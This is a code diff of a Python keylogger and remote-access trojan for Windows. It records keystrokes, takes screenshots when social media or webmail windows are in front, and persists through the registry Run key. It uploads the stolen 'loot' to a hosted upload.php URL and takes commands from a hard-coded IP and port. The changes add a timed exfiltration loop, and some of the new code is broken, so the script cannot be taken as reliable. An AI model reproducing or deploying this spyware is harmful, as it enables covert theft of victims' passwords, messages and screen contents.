@@ -1,8 +1,7 @@
 import socket
 import tempfile
-import threading
+from threading import Timer, Thread
 from PIL import ImageGrab
-from base64 import b64decode
 import platform
 from getpass import getuser
 from locale import getdefaultlocale
@@ -15,20 +14,20 @@ import json
 from datetime import datetime
 from hashlib import md5
 import requests
-import pyperclip
 import pythoncom, pyHook
 import win32gui
 
 uploadURL = 'http://monohydric-variatio.000webhostapp.com/upload.php'
 identification = {}
 botname = ''
-proxy = {'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"}
+proxy = os.environ['HTTP_PROXY']
 running = False
 store = ''
 listOfWindows = ['Facebook', 'Gmail', 'Twitter', 'Hotmail', 'Ymail', 'Yandex']
 obj = pyHook.HookManager()
 lastWindowText = ''
 windowText = ''
+tempdirpath = tempfile.mkdtemp()
 
 
 def keypressed(event):
@@ -37,13 +36,13 @@ def keypressed(event):
     # Take a screenshot if any of the mentioned website is in the front screen
     w = win32gui
     windowText = w.GetWindowText(w.GetForegroundWindow())
-    if lastWindowText != windowText:    # So that no useless screenshots
+    if lastWindowText != windowText:  # So that no useless screenshots
         if 'Facebook' in windowText or 'Gmail' in windowText or 'Twitter' in windowText \
                 or 'Ymail' in windowText or 'Hotmail' in windowText:
             screenshot()
 
     global store
-    print chr(event.Ascii)         # Print key info
+    print chr(event.Ascii)  # Print key info
 
     if event.Ascii == 13:
         keys = '< ENTER >'
@@ -64,20 +63,6 @@ def keylogger():
     obj.KeyDown = keypressed
     obj.HookKeyboard()
     pythoncom.PumpMessages()
-
-
-class myThread (threading.Thread):
-    def __init__(self, threadID, name, counter):
-        threading.Thread.__init__(self)
-        self.threadID = threadID
-        self.name = name
-        self.counter = counter
-
-    def run(self):
-        keylogger()
-
-
-thread1 = myThread(1, 'keylogThread', 1)
 
 
 def transfer(s, path):
@@ -128,13 +113,13 @@ def sendPost(Url, data, files=None):
     return response
 
 
-def sendFile(files=None):
+def sendFile(checksum, files=None):
     try:
-        response = requests.post(uploadURL, data={'botname': botname}, files=files, proxies={
-            'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"})
+        response = requests.post(uploadURL, data={'botname': botname}, files=files, proxies=proxy)
+        if checksum == response.headers('checksum'):    # To check the checksum for file transfer as ok
+            return 'Upl0ad3d0k'
     except Exception as e:
         return str(e)
-    return response
 
 
 def getSysDetails():
@@ -166,14 +151,9 @@ def getSysDetails():
 
 
 def screenshot():
-    dirpath = tempfile.mkdtemp()
     now = str(datetime.now()).replace(" ", "_")
     now = now.replace(":", "_")
-    ImageGrab.grab().save(dirpath + "\\" + now + "-img.jpg", "JPEG")
-    files = {'fileToUpload': open(dirpath + "\\" + now + "-img.jpg", 'rb')}
-    r = sendFile(files)
-    files['fileToUpload'].close()
-    shutil.rmtree(dirpath)
+    ImageGrab.grab().save(tempdirpath + "\\" + now + "-img.jpg", "JPEG")
 
 
 def search(command):
@@ -194,8 +174,8 @@ def search(command):
 def identity():
     global identification
     identification = getSysDetails()  # send sysDetails on initialisation and set hostname for identifying bot
-    dirpath = tempfile.mkdtemp()
-    files = open(dirpath + '\identity.txt', 'wb')
+    tempdirpath = tempfile.mkdtemp()
+    files = open(tempdirpath + '\identity.txt', 'wb')
     files.write(json.dumps(identification))
     files.close()
     key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
@@ -203,7 +183,7 @@ def identity():
     # Botname is the key name that will stop identity to be sent on each startup
     wreg.SetValueEx(key, 'botID', 0, wreg.REG_SZ, botname)
     key.Close()
-    return dirpath
+    return tempdirpath
 
 
 def initialize():
@@ -218,11 +198,11 @@ def initialize():
             0]  # ensures botname to be present at every startup , for uploading files
     except WindowsError:
         print key
-        dirpath = identity()
-        files = {'fileToUpload': open(dirpath + '\identity.txt', 'rb')}
+        tempdirpath = identity()
+        files = {'fileToUpload': open(tempdirpath + '\identity.txt', 'rb')}
         r = sendFile(files)
         files['fileToUpload'].close()
-        shutil.rmtree(dirpath)
+        shutil.rmtree(tempdirpath)
     key.Close()
 
 
@@ -234,6 +214,28 @@ def md5Hash(fname):  # Use this  to check successful transfer of data
     return hash_md5.hexdigest()
 
 
+def emptyLoot():
+    for dirpath, dirname, files in os.walk(tempdirpath):
+        count = len(files)  # To keep track whether all files have been transferred
+        while count:
+            for fileName in files:
+                sendingFile = {'fileToUpload': open(fileName, 'rb')}
+                checksum = md5Hash(sendingFile['fileToUpload'])         # Send the md5sum hash to compare with
+                didItGetTransferred = sendFile(checksum, sendingFile)
+                if didItGetTransferred == 'Upl0ad3d0k':   # only delete if file transferred successfully
+                    try:
+                        os.remove(dirpath + '/' + fileName)
+                        count -= 1
+                    except:
+                        pass
+
+
+def terminate(s):
+    s.close()
+    keyloggerThread.exit()
+    emptyLoot()         # To transfer files
+
+
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(('172.26.47.11', 1996))
@@ -242,8 +244,7 @@ def connect():
     while True:
         command = s.recv(1024)
         if 'terminate' in command:
-            s.close()
-            thread1.name.exit()
+            terminate(s)
             break
 
         elif 'grab' in command:
@@ -284,9 +285,12 @@ def connect():
 
 
 def main():
-    thread1.start()
+    keyloggerThread = Thread(1, keylogger(), 'keylogThread', 1)
+    keyloggerThread.start()
     initialize()
-    connect()
+    lootThread = Timer(30, emptyLoot())     # Timer thread to send loot after every 30 seconds
+    lootThread.start()
+    connect()  # terminate() called when connection is closed
 
 
 main()
